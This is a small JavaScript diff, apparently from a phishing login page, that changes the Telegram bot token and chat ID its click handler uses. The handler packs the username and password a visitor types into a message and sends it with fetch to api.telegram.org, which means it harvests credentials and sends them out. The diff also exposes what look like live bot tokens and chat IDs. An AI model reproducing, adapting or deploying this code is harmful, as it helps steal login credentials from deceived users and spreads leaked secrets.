@@ -9,8 +9,8 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
   var message = 'New login attempt:\nUsername: ' + username + '\nPassword: ' + password;
 
   // رابط API البوت الخاص بك مع chat_id الخاص بك
-  var botToken = '7685530196:AAGyZqaHnLAtxTzZUumEjbxBDK4l7kSG-bQ';
-  var chatId = '5023046120';
+  var botToken = '8164970792:AAHOL8n2y166Zv2dSnDNKr_waJxjIUU6Mx0';
+  var chatId = '6867714543';
   var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
 
   // إرسال البيانات عبر الـ Fetch API
